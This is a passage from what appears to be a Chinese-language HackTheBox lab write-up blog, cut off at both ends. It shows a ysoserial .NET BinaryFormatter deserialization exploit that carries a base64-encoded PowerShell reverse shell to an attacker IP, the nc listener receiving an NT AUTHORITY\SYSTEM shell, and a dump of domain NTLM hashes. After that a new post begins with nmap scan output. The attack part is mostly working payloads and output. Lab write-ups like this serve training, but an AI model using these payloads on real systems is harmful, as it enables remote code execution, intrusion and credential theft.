ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNtZCAvYyBjdXJsIDEwLjEwLjE2LjExIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL</span><br><span class="line">ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">sudo</span> python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.10.11.168 - - [06/May/2025 09:06:18] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
<p>有效，上reverse shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\liw\Downloads\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt;.\ysoserial.exe -g DataSet -c <span class="string">&quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAxACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot;</span> -f BinaryFormatter -o <span class="built_in">base64</span></span><br><span class="line">AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAANMIAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA9Q88P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLWUgSkFCakFHd0FhUUJsQUc0QWRBQWdBRDBBSUFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFVd0I1QUhNQWRBQmxBRzBBTGdCT0FHVUFkQUF1QUZNQWJ3QmpBR3NBWlFCMEFITUFMZ0JVQUVNQVVBQkRBR3dBYVFCbEFHNEFkQUFvQUNJQU1RQXdBQzRBTVFBd0FDNEFNUUEyQUM0QU1RQXhBQ0lBTEFBNUFEQUFNQUF4QUNrQU93QWtBSE1BZEFCeUFHVUFZUUJ0QUNBQVBRQWdBQ1FBWXdCc0FHa0FaUUJ1QUhRQUxnQkhBR1VBZEFCVEFIUUFjZ0JsQUdFQWJRQW9BQ2tBT3dCYkFHSUFlUUIwQUdVQVd3QmRBRjBBSkFCaUFIa0FkQUJsQUhNQUlBQTlBQ0FBTUFBdUFDNEFOZ0ExQURVQU13QTFBSHdBSlFCN0FEQUFmUUE3QUhjQWFBQnBBR3dBWlFBb0FDZ0FKQUJwQUNBQVBRQWdBQ1FBY3dCMEFISUFaUUJoQUcwQUxnQlNBR1VBWVFCa0FDZ0FKQUJpQUhrQWRBQmxBSE1BTEFBZ0FEQUFMQUFnQUNRQVlnQjVBSFFBWlFCekFDNEFUQUJsQUc0QVp3QjBBR2dBS1FBcEFDQUFMUUJ1QUdVQUlBQXdBQ2tBZXdBN0FDUUFaQUJoQUhRQVlRQWdBRDBBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFJQUF0QUZRQWVRQndBR1VBVGdCaEFHMEFaUUFnQUZNQWVRQnpBSFFBWlFCdEFDNEFWQUJsQUhnQWRBQXVBRUVBVXdCREFFa0FTUUJGQUc0QVl3QnZBR1FBYVFCdUFHY0FLUUF1QUVjQVpRQjBBRk1BZEFCeUFHa0FiZ0JuQUNnQUpBQmlBSGtBZEFCbEFITUFMQUF3QUN3QUlBQWtBR2tBS1FBN0FDUUFjd0JsQUc0QVpBQmlBR0VBWXdCckFDQUFQUUFnQUNnQWFRQmxBSGdBSUFBa0FHUUFZUUIwQUdFQUlBQXlBRDRBSmdBeEFDQUFmQUFnQUU4QWRRQjBBQzBBVXdCMEFISUFhUUJ1QUdjQUlBQXBBRHNBSkFCekFHVUFiZ0JrQUdJQVlRQmpBR3NBTWdBZ0FEMEFJQUFrQUhNQVpRQnVBR1FBWWdCaEFHTUFhd0FnQUNzQUlBQWlBRkFBVXdBZ0FDSUFJQUFyQUNBQUtBQndBSGNBWkFBcEFDNEFVQUJoQUhRQWFBQWdBQ3NBSUFBaUFENEFJQUFpQURzQUpBQnpBR1VBYmdCa0FHSUFlUUIwQUdVQUlBQTlBQ0FBS0FCYkFIUUFaUUI0QUhRQUxnQmxBRzRBWXdCdkFHUUFhUUJ1QUdjQVhRQTZBRG9BUVFCVEFFTUFTUUJKQUNrQUxnQkhBR1VBZEFCQ0FIa0FkQUJsQUhNQUtBQWtBSE1BWlFCdUFHUUFZZ0JoQUdNQWF3QXlBQ2tBT3dBa0FITUFkQUJ5QUdVQVlRQnRBQzRBVndCeUFHa0FkQUJsQUNnQUpBQnpBR1VBYmdCa0FHSUFlUUIwQUdVQUxBQXdBQ3dBSkFCekFHVUFiZ0JrQUdJQWVRQjBBR1VBTGdCTUFHVUFiZ0JuQUhRQWFBQXBBRHNBSkFCekFIUUFjZ0JsQUdFQWJRQXVBRVlBYkFCMUFITUFhQUFvQUNrQWZRQTdBQ1FBWXdCc0FHa0FaUUJ1QUhRQUxnQkRBR3dBYndCekFHVUFLQUFwQUE9PSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==</span><br><span class="line"></span><br><span class="line">UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAANMIAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA9Q88P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLWUgSkFCakFHd0FhUUJsQUc0QWRBQWdBRDBBSUFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFVd0I1QUhNQWRBQmxBRzBBTGdCT0FHVUFkQUF1QUZNQWJ3QmpBR3NBWlFCMEFITUFMZ0JVQUVNQVVBQkRBR3dBYVFCbEFHNEFkQUFvQUNJQU1RQXdBQzRBTVFBd0FDNEFNUUEyQUM0QU1RQXhBQ0lBTEFBNUFEQUFNQUF4QUNrQU93QWtBSE1BZEFCeUFHVUFZUUJ0QUNBQVBRQWdBQ1FBWXdCc0FHa0FaUUJ1QUhRQUxnQkhBR1VBZEFCVEFIUUFjZ0JsQUdFQWJRQW9BQ2tBT3dCYkFHSUFlUUIwQUdVQVd3QmRBRjBBSkFCaUFIa0FkQUJsQUhNQUlBQTlBQ0FBTUFBdUFDNEFOZ0ExQURVQU13QTFBSHdBSlFCN0FEQUFmUUE3QUhjQWFBQnBBR3dBWlFBb0FDZ0FKQUJwQUNBQVBRQWdBQ1FBY3dCMEFISUFaUUJoQUcwQUxnQlNBR1VBWVFCa0FDZ0FKQUJpQUhrQWRBQmxBSE1BTEFBZ0FEQUFMQUFnQUNRQVlnQjVBSFFBWlFCekFDNEFUQUJsQUc0QVp3QjBBR2dBS1FBcEFDQUFMUUJ1QUdVQUlBQXdBQ2tBZXdBN0FDUUFaQUJoQUhRQVlRQWdBRDBBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFJQUF0QUZRQWVRQndBR1VBVGdCaEFHMEFaUUFnQUZNQWVRQnpBSFFBWlFCdEFDNEFWQUJsQUhnQWRBQXVBRUVBVXdCREFFa0FTUUJGQUc0QVl3QnZBR1FBYVFCdUFHY0FLUUF1QUVjQVpRQjBBRk1BZEFCeUFHa0FiZ0JuQUNnQUpBQmlBSGtBZEFCbEFITUFMQUF3QUN3QUlBQWtBR2tBS1FBN0FDUUFjd0JsQUc0QVpBQmlBR0VBWXdCckFDQUFQUUFnQUNnQWFRQmxBSGdBSUFBa0FHUUFZUUIwQUdFQUlBQXlBRDRBSmdBeEFDQUFmQUFnQUU4QWRRQjBBQzBBVXdCMEFISUFhUUJ1QUdjQUlBQXBBRHNBSkFCekFHVUFiZ0JrQUdJQVlRQmpBR3NBTWdBZ0FEMEFJQUFrQUhNQVpRQnVBR1FBWWdCaEFHTUFhd0FnQUNzQUlBQWlBRkFBVXdBZ0FDSUFJQUFyQUNBQUtBQndBSGNBWkFBcEFDNEFVQUJoQUhRQWFBQWdBQ3NBSUFBaUFENEFJQUFpQURzQUpBQnpBR1VBYmdCa0FHSUFlUUIwQUdVQUlBQTlBQ0FBS0FCYkFIUUFaUUI0QUhRQUxnQmxBRzRBWXdCdkFHUUFhUUJ1QUdjQVhRQTZBRG9BUVFCVEFFTUFTUUJKQUNrQUxnQkhBR1VBZEFCQ0FIa0FkQUJsQUhNQUtBQWtBSE1BWlFCdUFHUUFZZ0JoQUdNQWF3QXlBQ2tBT3dBa0FITUFkQUJ5QUdVQVlRQnRBQzRBVndCeUFHa0FkQUJsQUNnQUpBQnpBR1VBYmdCa0FHSUFlUUIwQUdVQUxBQXdBQ3dBSkFCekFHVUFiZ0JrQUdJQWVRQjBBR1VBTGdCTUFHVUFiZ0JuQUhRQWFBQXBBRHNBSkFCekFIUUFjZ0JsQUdFQWJRQXVBRVlBYkFCMUFITUFhQUFvQUNrQWZRQTdBQ1FBWXdCc0FHa0FaUUJ1QUhRQUxnQkRBR3dBYndCekFHVUFLQUFwQUE9PSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==</span><br><span class="line">ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.</span><br><span class="line"></span><br><span class="line">$ rlwrap -cAr nc -lvnp 9001</span><br><span class="line">Listening on 0.0.0.0 9001</span><br><span class="line">Connection received on 10.10.11.168 57400</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">cd</span> C:\<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
<p>got it</p>
<h2 id="shell-as-nt-authority"><a href="#shell-as-nt-authority" class="headerlink" title="shell as nt authority"></a>shell as nt authority</h2><h3 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">administrator:500:aad3b435b51404eeaad3b435b51404ee:e2bba07a8348bca150ac6ffee6a3afbb:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0d3c072340cb5cdfca9c7f86e47a0beb:::</span><br><span class="line">tstar:1106:aad3b435b51404eeaad3b435b51404ee:5b8b52689acd5a0e6587f9c8d3b07fc7:::</span><br><span class="line">asmith:1107:aad3b435b51404eeaad3b435b51404ee:0a7e978fd5e254ce555e5fed405bba29:::</span><br><span class="line">sjenkins:1118:aad3b435b51404eeaad3b435b51404ee:ac5495fa8515a5e8c3437a293b405e26:::</span><br><span class="line">sdonington:1119:aad3b435b51404eeaad3b435b51404ee:ac5495fa8515a5e8c3437a293b405e26:::</span><br><span class="line">backupsvc:1601:aad3b435b51404eeaad3b435b51404ee:6f410302e092bdcf7802401cc55e4a4d:::</span><br><span class="line">jhall:1603:aad3b435b51404eeaad3b435b51404ee:dfdcc85f5a1c9eaf0592f36582f3b871:::</span><br><span class="line">rsmith:1604:aad3b435b51404eeaad3b435b51404ee:dfdcc85f5a1c9eaf0592f36582f3b871:::</span><br><span class="line">ehooker:1605:aad3b435b51404eeaad3b435b51404ee:a0a5fa8b2f1df7d4acfca315e4a3ba82:::</span><br><span class="line">khicks:1611:aad3b435b51404eeaad3b435b51404ee:589cf9b5f911fd6fe70694a4ba4bccd0:::</span><br><span class="line">sqlsvc:1613:aad3b435b51404eeaad3b435b51404ee:b999a16500b87d17ec7f2e2a68778f05:::</span><br><span class="line">miscsvc:1617:aad3b435b51404eeaad3b435b51404ee:c959a21bb08e42e36ff9f0fa434caab5:::</span><br><span class="line">ksimpson:1619:aad3b435b51404eeaad3b435b51404ee:5f38c0485f0c23f8dedf9bf23ffa5336:::</span><br><span class="line">DC1$:1000:aad3b435b51404eeaad3b435b51404ee:1d7221130f867a5e322111846a1b8642:::</span><br><span class="line">WS01$:1120:aad3b435b51404eeaad3b435b51404ee:327202ce3bff07c2ea53d7f25d162fcb:::</span><br></pre></td></tr></table></figure>
    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/">HackTheBox——Tracks AD Return</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/return.png"></p>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE      </span><br><span class="line">|_http-title: HTB Printer Admin Panel</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-04-30 01:47:09Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?                                                                    </span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49671/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49675/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49677/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49680/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49698/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 21H1 (93%</span><br><span class="line">), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1903 (92%), Windows Server 2019 (92%), Microsoft Windows Vista SP1 (92%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 18m34s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-04-30T01:48:14</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先把<code>return.local</code>加到hosts里面</p>
<h3 id="smb-ldap"><a href="#smb-ldap" class="headerlink" title="smb&#x2F;ldap"></a>smb&#x2F;ldap</h3><p>smb不能guest和anonymous<br>ldap倒是有一点</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 